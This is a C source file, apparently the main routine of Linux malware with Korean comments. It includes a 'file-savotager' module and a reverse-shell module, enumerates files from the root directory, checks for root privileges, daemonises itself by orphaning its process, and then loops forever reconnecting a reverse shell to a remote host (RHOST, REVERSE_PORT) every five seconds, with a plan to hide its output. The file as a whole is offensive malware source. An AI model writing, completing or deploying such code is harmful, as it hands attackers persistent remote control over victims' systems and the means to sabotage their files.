#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/wait.h>

#include "header/file-savotager.h"
#include "header/reverse-sh.h"
#include "header/init.h"
#include "header/const.h"

int main(int argv, char * argc[]) {
    char ** arr = get_file_list("/");
    char ** piv = arr;
    int cpid, state;

    // TODO: STDOUT을 File로 돌리고, STDERR를 /dev/null이나 파일로. 
    init(argc[0]);

    // TODO: root 권한 유무에 따른 동작 구분
    if (geteuid() == 0) {
        
    } else {
        get_rw_file_list();
    }

    switch(fork()) {
        case -1:
        case 0:
            break;
        default:
            // 고의로 orphan process로 만들자.
            return 0;
    }

    // 리버스쉘 요청을 반복 수행.
    while (1) {
        switch ((cpid = fork())) {
            case -1:
                sleep(5);
                break;
            case 0:
                while (reverse_shell(RHOST, REVERSE_PORT)) {
                    sleep(5);
                }
            default:
                waitpid(cpid, &state, 0);
                break;
        }
    }
    return 0;
}
